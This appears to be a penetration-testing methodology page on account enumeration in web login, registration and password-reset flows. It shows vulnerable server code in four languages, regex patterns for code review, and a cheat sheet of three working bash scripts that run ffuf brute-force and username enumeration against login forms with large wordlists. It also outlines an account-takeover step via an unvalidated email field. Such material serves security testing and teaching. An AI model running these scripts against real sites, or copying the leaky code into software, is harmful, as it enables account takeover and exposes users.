# Account Enumeration

## Check List

* [ ] Review processes that pertain to user identification (e.g. registration, login, etc.).
* [ ] Enumerate users where possible through response analysis.

## Methodology&#x20;

### Black Box

#### **Account Enumeration Via The “Forgot Password”**

{% stepper %}
{% step %}
Another common method used on many websites, especially for password reset, works like this
{% endstep %}

{% step %}
When you click on `Forgot Password` the site asks for your email or phone number If the email or phone number belongs to a registered user, the site sends a reset link or a message But if the email or number isn't in the system, it shows a message stating that `it's not registered`&#x20;
{% endstep %}
{% endstepper %}

***

#### **Account Enumeration Via The Registration Flow**

{% stepper %}
{% step %}
Enter the registration process in the system and use the Burp Suite tool to track requests and use a test and duplicate email
{% endstep %}

{% step %}
During the registration process, if a duplicate email is used, the system will display the message "Email Already Exists". This message means that there is an enumeration vulnerability that can reveal a large list of valid users and emails How can we create a list of accounts? Request an interception, click on the email field with Burp Suite, and press Ctrl + I to save it in the Intruder field. In the Payload tab, Set the attack type to Sniper and provide the list of emails. Using the server response that indicates "Email already exists" or any other response, we set the value in the system response within the Grep-match settings, which allows us to understand the output more accurately and find valid accounts
{% endstep %}

{% step %}
Next, go to the profile editing section where you can edit your name, email, and mobile number. However, the important point here is that if the email is inactive or grayed out, you should track the request and check whether it will still be sent despite the email being inactive
{% endstep %}

{% step %}
By testing the email edit section, if the system accepts the requested emails as unvalidated, you can enter a valid email using the list of accounts obtained in the Account Enumeration vulnerability
{% endstep %}

{% step %}
The system accepts valid emails without validation, recognizes them as active emails, and logs us into the valid email profile (i.e., logging into the user account)
{% endstep %}
{% endstepper %}

***

### White Box

#### User Enumeration via Inconsistent Authentication and Account Recovery Responses

{% stepper %}
{% step %}
Map the entire system using Burp Suite and identify all functionalities related to **Login, Registration, Password Reset, Forgot Password, Account Recovery, Invite User, SSO Login, MFA Enrollment, and Username/Email Validation endpoints**. Capture all responses that may reveal user existence through status codes, response messages, or timing differences
{% endstep %}

{% step %}
Locate authentication-related controllers, services, or middleware responsible for login and identity validation, and trace the full authentication flow from request input to response generation

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost]
[Route("api/auth/login")]
public IActionResult Login([FromBody] LoginRequest request)
{
    var user = _context.Users.FirstOrDefault(x => x.Email == request.Email);

    if (user == null)
        return BadRequest("User does not exist");

    if (!PasswordHasher.Verify(request.Password, user.PasswordHash))
        return Unauthorized("Invalid password");

    return Ok(new { token = JwtGenerator.Generate(user) });
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping
@RequestMapping("api/auth/login")
public Object Login(@RequestBody LoginRequest request)
{
    User user = _context.getUsers()
        .stream()
        .filter(x -> x.getEmail().equals(request.getEmail()))
        .findFirst()
        .orElse(null);

    if (user == null)
        return BadRequest("User does not exist");

    if (!PasswordHasher.verify(request.getPassword(), user.getPasswordHash()))
        return Unauthorized("Invalid password");

    return Ok(Map.of("token", JwtGenerator.generate(user)));
}
```
{% endtab %}

{% tab title="PHP" %}
```php
#[HttpPost]
#[Route("api/auth/login")]
public function Login(LoginRequest $request)
{
    $user = $this->_context->Users
        ->where(fn($x) => $x->Email == $request->Email)
        ->first();

    if ($user == null)
        return BadRequest("User does not exist");

    if (!PasswordHasher::verify($request->Password, $user->PasswordHash))
        return Unauthorized("Invalid password");

    return Ok(["token" => JwtGenerator::generate($user)]);
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
app.post("/api/auth/login", (request, response) => {
    const user = _context.Users.find(x => x.Email === request.body.Email);

    if (!user)
        return BadRequest("User does not exist");

    if (!PasswordHasher.verify(request.body.Password, user.PasswordHash))
        return Unauthorized("Invalid password");

    return Ok({ token: JwtGenerator.generate(user) });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review all authentication input models and determine which identifiers are accepted for user lookup (Email, Username, Phone Number, UPN, ExternalId) and whether they are validated differently

{% tabs %}
{% tab title="C#" %}
```csharp
public class LoginRequest
{
    public string Email { get; set; }
    public string Username { get; set; }
    public string PhoneNumber { get; set; }
    public string Password { get; set; }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class LoginRequest
{
    private String email;
    private String username;
    private String phoneNumber;
    private String password;

    // getters/setters
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class LoginRequest
{
    public string $Email;
    public string $Username;
    public string $PhoneNumber;
    public string $Password;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
class LoginRequest
{
    constructor()
    {
        this.Email = null;
        this.Username = null;
        this.PhoneNumber = null;
        this.Password = null;
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Analyze whether the application returns different responses for existing vs non-existing accounts in login, registration, or password reset flows (status codes, error messages, response structure, or timing)

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(scim\/v2\/Users|ScimUserRequest|Provision|Provisioning|Sync|LDAP|SSO|AzureAD|Okta|UserManagement|ImportUser|CreateUser|AutoProvision)|(\[HttpPost\])|(\[Route\s*\(\s*["']scim)|(\[FromBody\])|(Roles|Groups|Permission|Permissions|TenantId|Organization|Department|Manager|ExternalId|ObjectId|EmployeeId|EnterpriseUser)|(
user\.(Role|Roles|Group|Groups|Permission|Permissions|IsAdmin|TenantId|Organization|Department|Manager)\s*=)|(request\.(Roles|Groups|Role|IsAdmin|TenantId|Department|Manager|ExternalId|Email))|(_context\.Users\.Add)|(\.SaveChanges\s*\()|(FirstOrDefault\s*\()|(Email\s*==|ExternalId\s*==|ObjectId\s*==)|(IsAdmin\s*==|Role\s*==)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(@PostMapping|@RequestMapping|scim|provision|sync|ldap|sso|azuread|okta|userimport|createuser|autoprovision|UserRequest|ScimUserRequest)|(setRole\s*\(|setGroups\s*\(|setPermissions\s*\(|setIsAdmin\s*\(|setTenantId\s*\(|setDepartment\s*\()|(request\.getRoles|request\.getGroups|request\.getExternalId|request\.getEmail)|(save\s*\(|saveAndFlush\s*\()|(findByEmail|findByExternalId|findByObjectId)|(ROLE_|GROUP_|TENANT_)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(scim|provision|sync|ldap|sso|azuread|okta|userimport|createuser|autoprovision)|(\$_(POST|GET|REQUEST))|(\$request->input)|(\$request->roles)|(\$request->groups)|(\$request->email)|(\$request->external_id)|(->role\s*=)|(->roles\s*=)|(->group\s*=)|(->groups\s*=)|(->is_admin\s*=)|(->tenant_id\s*=)|(->organization_id\s*=)|(->save\s*\()|(User::create)|(firstOrCreate)|(updateOrCreate)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(scim|provision|sync|ldap|sso|azuread|okta|userimport|createuser|autoprovision)|(req\.body\.(role|roles|groups|isAdmin|tenantId|organizationId|department|manager|externalId|objectId|email))|(\.role\s*=)|(\.roles\s*=)|(\.groups\s*=)|(\.isAdmin\s*=)|(\.tenantId\s*=)|(User\.create)|(user\.save\s*\()|(findOne\s*\(\s*\{.*email)|(findOne\s*\(\s*\{.*externalId)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
scim\/v2\/Users|ScimUserRequest|Provision|Provisioning|Sync|LDAP|SSO|AzureAD|Okta|UserManagement|ImportUser|CreateUser|AutoProvision|\[HttpPost\]|\[Route\s*\(\s*["']scim|\[FromBody\]|Roles|Groups|Permission|Permissions|TenantId|Organization|Department|Manager|ExternalId|ObjectId|EmployeeId|EnterpriseUser|user\.(Role|Roles|Group|Groups|Permission|Permissions|IsAdmin|TenantId|Organization|Department|Manager)\s*=|request\.(Roles|Groups|Role|IsAdmin|TenantId|Department|Manager|ExternalId|Email)|_context\.Users\.Add|\.SaveChanges\s*\(|FirstOrDefault\s*\(|Email\s*==|ExternalId\s*==|ObjectId\s*==|IsAdmin\s*==|Role\s*==
```
{% endtab %}

{% tab title="Java" %}
```regexp
@PostMapping|@RequestMapping|scim|provision|sync|ldap|sso|azuread|okta|userimport|createuser|autoprovision|UserRequest|ScimUserRequest|setRole\s*\(|setGroups\s*\(|setPermissions\s*\(|setIsAdmin\s*\(|setTenantId\s*\(|setDepartment\s*\(|request\.getRoles|request\.getGroups|request\.getExternalId|request\.getEmail|save\s*\(|saveAndFlush\s*\(|findByEmail|findByExternalId|findByObjectId|ROLE_|GROUP_|TENANT_
```
{% endtab %}

{% tab title="PHP" %}
```regexp
scim|provision|sync|ldap|sso|azuread|okta|userimport|createuser|autoprovision|\$_(POST|GET|REQUEST)|\$request->input|\$request->roles|\$request->groups|\$request->email|\$request->external_id|->role\s*=|->roles\s*=|->group\s*=|->groups\s*=|->is_admin\s*=|->tenant_id\s*=|->organization_id\s*=|->save\s*\(|User::create|firstOrCreate|updateOrCreate
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
scim|provision|sync|ldap|sso|azuread|okta|userimport|createuser|autoprovision|req\.body\.(role|roles|groups|isAdmin|tenantId|organizationId|department|manager|externalId|objectId|email)|\.role\s*=|\.roles\s*=|\.groups\s*=|\.isAdmin\s*=|\.tenantId\s*=|User\.create|user\.save\s*\(|findOne\s*\(\s*\{.*email|findOne\s*\(\s*\{.*externalId
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
if (user == null)
{
    return BadRequest("Account not found");
}
else
{
    return BadRequest("Incorrect password");
}
```
{% endtab %}

{% tab title="Java" %}
```java
if (user == null)
{
    return BadRequest("Account not found");
}
else
{
    return BadRequest("Incorrect password");
}
```
{% endtab %}

{% tab title="PHP" %}
```php
if ($user == null)
{
    return BadRequest("Account not found");
}
else
{
    return BadRequest("Incorrect password");
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
if (user == null)
{
    return BadRequest("Account not found");
}
else
{
    return BadRequest("Incorrect password");
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review password reset and account recovery logic to determine whether email/username existence is validated before sending reset tokens or OTPs

{% tabs %}
{% tab title="C#" %}
```csharp
var user = _context.Users.FirstOrDefault(x => x.Email == request.Email);

if (user != null)
{
    SendResetLink(user.Email);
}

return Ok("If the account exists, a reset link has been sent");
```
{% endtab %}

{% tab title="Java" %}
```java
User user = _context.getUsers()
    .stream()
    .filter(x -> x.getEmail().equals(request.getEmail()))
    .findFirst()
    .orElse(null);

if (user != null)
{
    SendResetLink(user.getEmail());
}

return Ok("If the account exists, a reset link has been sent");
```
{% endtab %}

{% tab title="PHP" %}
```php
$user = $this->_context->Users
    ->where(fn($x) => $x->Email == $request->Email)
    ->first();

if ($user != null)
{
    SendResetLink($user->Email);
}

return Ok("If the account exists, a reset link has been sent");
```
{% endtab %}

{% tab title="Node.js" %}
```js
const user = _context.Users.find(x => x.Email === request.body.Email);

if (user)
{
    SendResetLink(user.Email);
}

return Ok("If the account exists, a reset link has been sent");
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check registration and invite flows for behavior differences when attempting to register with existing emails or usernames, which can confirm account existence

{% tabs %}
{% tab title="C#" %}
```csharp
if (_context.Users.Any(x => x.Email == request.Email))
{
    return Conflict("Email already registered");
}

_context.Users.Add(new User { Email = request.Email });
_context.SaveChanges();
```
{% endtab %}

{% tab title="Java" %}
```java
if (_context.getUsers().stream().anyMatch(x -> x.getEmail().equals(request.getEmail())))
{
    return Conflict("Email already registered");
}

_context.getUsers().add(new User(request.getEmail()));
_context.saveChanges();
```
{% endtab %}

{% tab title="PHP" %}
```php
if ($this->_context->Users->any(fn($x) => $x->Email == $request->Email))
{
    return Conflict("Email already registered");
}

$this->_context->Users->add(new User(["Email" => $request->Email]));
$this->_context->saveChanges();
```
{% endtab %}

{% tab title="Node.js" %}
```js
if (_context.Users.some(x => x.Email === request.body.Email))
{
    return Conflict("Email already registered");
}

_context.Users.push({ Email: request.body.Email });
_context.saveChanges();
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Analyze timing-based enumeration vectors where response latency differs between valid and invalid usernames/emails due to database lookups, hashing, or external identity provider checks

{% tabs %}
{% tab title="C#" %}
```csharp
var user = _context.Users.FirstOrDefault(x => x.Username == request.Username);

// Password hashing only executed if user exists
if (user != null)
{
    PasswordHasher.Verify(request.Password, user.PasswordHash);
}
```
{% endtab %}

{% tab title="Java" %}
```java
User user = _context.getUsers()
    .stream()
    .filter(x -> x.getUsername().equals(request.getUsername()))
    .findFirst()
    .orElse(null);

// Password hashing only executed if user exists
if (user != null)
{
    PasswordHasher.verify(request.getPassword(), user.getPasswordHash());
}
```
{% endtab %}

{% tab title="PHP" %}
```php
$user = $this->_context->Users
    ->where(fn($x) => $x->Username == $request->Username)
    ->first();

// Password hashing only executed if user exists
if ($user != null)
{
    PasswordHasher::verify($request->Password, $user->PasswordHash);
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
const user = _context.Users.find(x => x.Username === request.body.Username);

// Password hashing only executed if user exists
if (user)
{
    PasswordHasher.verify(request.body.Password, user.PasswordHash);
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
ntercept authentication, registration, and recovery requests using Burp Suite and systematically test variations of usernames/emails/phones to determine whether the system leaks account existence through
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

### Status Code

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano sc-user-enum.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com/login> <userlist.txt> <passlist.txt>"
    exit 1
fi

URL="$1"
USERLIST="$2"
PASSLIST="$3"

# Fetch login page HTML
HTML=$(curl -s "$URL")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 50)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="/"
fi

# Extract form method (default to GET)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="get"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    # Relative path without starting slash
    BASE_URL=$(echo "$URL" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password input field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

# Set defaults if extraction failed
if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract CSRF token or similar hidden field (e.g., csrfToken, _token, nonce)
CSRF_FIELD=$(echo "$FORM" | grep -oiP '<input[^>]+name="\K[^"]*(csrf|token|nonce)[^"]*' | head -1)
CSRF_VALUE=""
if [ -n "$CSRF_FIELD" ]; then
    CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
fi

# Prepare payload data for fuzzing
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
    DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
fi

# Extract cookies - extract only name=value for each Set-Cookie
COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')

# Build headers array
HEADERS=(
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Connection: keep-alive"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Referer: $URL"
)

# Add cookies header if found
if [ -n "$COOKIES" ]; then
    HEADERS+=(-H "Cookie: $COOKIES")
fi

# Run ffuf with constructed parameters
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x sc-user-enum.sh;sudo ./sc-user-enum.sh $WEBSITE/login \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

### Error Message

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano em-user-enum.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com/login> <userlist.txt> <passlist.txt>"
    exit 1
fi

URL="$1"
USERLIST="$2"
PASSLIST="$3"

# Fetch login page HTML
HTML=$(curl -s "$URL")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 50)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="/"
fi

# Extract form method (default to GET)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="get"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    # Relative path without starting slash
    BASE_URL=$(echo "$URL" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password input field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

# Set defaults if extraction failed
if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract CSRF token or similar hidden field (e.g., csrfToken, _token, nonce)
CSRF_FIELD=$(echo "$FORM" | grep -oiP '<input[^>]+name="\K[^"]*(csrf|token|nonce)[^"]*' | head -1)
CSRF_VALUE=""
if [ -n "$CSRF_FIELD" ]; then
    CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
fi

# Prepare payload data for fuzzing
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
    DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
fi

# Extract cookies - extract only name=value for each Set-Cookie
COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')

# Build headers array
HEADERS=(
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Connection: keep-alive"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Referer: $URL"
)

# Add cookies header if found
if [ -n "$COOKIES" ]; then
    HEADERS+=(-H "Cookie: $COOKIES")
fi

# Run ffuf with constructed parameters
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x em-user-enum.sh;sudo ./em-user-enum.sh $WEBSITE/login \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

### **Nonexistent Username**

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano nu-user-enum.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com/login> <userlist.txt>"
    exit 1
fi

URL="$1"
USERLIST="$2"

# Fetch login page HTML
HTML=$(curl -s "$URL")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 50)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="/"
fi

# Extract form method (default to GET)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="get"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    # Relative path without starting slash
    BASE_URL=$(echo "$URL" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password input field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

# Set defaults if extraction failed
if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract CSRF token or similar hidden field (e.g., csrfToken, _token, nonce)
CSRF_FIELD=$(echo "$FORM" | grep -oiP '<input[^>]+name="\K[^"]*(csrf|token|nonce)[^"]*' | head -1)
CSRF_VALUE=""
if [ -n "$CSRF_FIELD" ]; then
    CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
fi

# Prepare payload data for fuzzing
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=Fakepassword1234"
if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
    DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
fi

# Extract cookies - extract only name=value for each Set-Cookie
COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I')

# Build headers array
HEADERS=(
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Connection: keep-alive"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Referer: $URL"
)

# Add cookies header if found
if [ -n "$COOKIES" ]; then
    HEADERS+=(-H "Cookie: $COOKIES")
fi

# Run ffuf with constructed parameters
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         -mr "invalid username|user not found|unknown user|no such user|نام کاربری اشتباه|کاربر یافت نشد" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         -mr "invalid username|user not found|unknown user|no such user|نام کاربری اشتباه|کاربر یافت نشد" \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x nu-user-enum.sh;sudo ./nu-user-enum.sh $WEBSITE/login \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
